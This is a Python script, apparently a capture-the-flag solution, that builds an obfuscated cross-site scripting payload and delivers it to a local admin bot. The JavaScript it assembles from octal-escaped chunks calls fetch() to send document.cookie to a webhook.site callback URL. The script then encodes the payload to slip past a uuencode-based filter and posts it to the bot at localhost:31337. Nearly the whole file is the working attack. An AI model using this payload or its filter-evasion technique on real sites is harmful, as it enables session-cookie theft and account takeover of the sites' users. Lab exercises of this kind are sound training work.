import base64
import math
import requests

def lpad(s):
    return "0"*(6-len(s))+s

def toOct(s):
    return "\\"+oct(ord(s))[2:].rjust(3,"0")


first = [
"<SCRIPT>M=1;C=[]['\\141\\164'];", # []['at']
";E=C['\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162']"] # ['constructor']

callback_url = "https://webhook.site/a4465c3a-5865-41d4-9ae7-604ace285fb1"
payload = f'fetch("{callback_url}?"+document.cookie)'
payload = [toOct(c) for c in payload]

# Since we uuencode, we need to split the payload into chunks so that we dont overlap the 60 char limit
# toOct needs 4 chars per 'char' in the payload, 4*13 = 52 so then we can use the spare 8 chars for assignment and variables names etc.
chunk_size = 13 
chunks = math.ceil(len(payload)/chunk_size)

chunked_payload = [f";P{i}='"+"".join(payload[i*chunk_size:(i+1)*chunk_size])+"'" for i in range(chunks)]


last=[
";X="+"+".join([f"P{i}" for i in range(chunks)]),
";E(X)();",
"</SCRIPT>"] # the target string


target=first+chunked_payload+last

for i in range(len(target)):
    if len(target[i]) > 58:
        print("Shorten line", i)
        exit(1)
    target[i] = target[i].ljust(60, ";") # pad to 60 chars with ; since it doesnt do anything
target = "".join(target)

target = [lpad(bin((ord(c)-32))[2:]) for c in target] # take each char-32 and convert to binary, then pad to 6 bits
target = "".join(target) # join all the binary strings together
target = target + "0"*(8-len(target)%8) # align to 8 bits
target = [int(target[i:i+8],2) for i in range(0, len(target), 8)] # split into 8 bit chunks and convert to int
target = base64.b64encode(bytes(target))


bot_url = "http://localhost:31337/admin"
json = {"url": f"http://localhost:31337/?input={target}&encoding=uu"}
requests.post(bot_url, json=json)

print(target)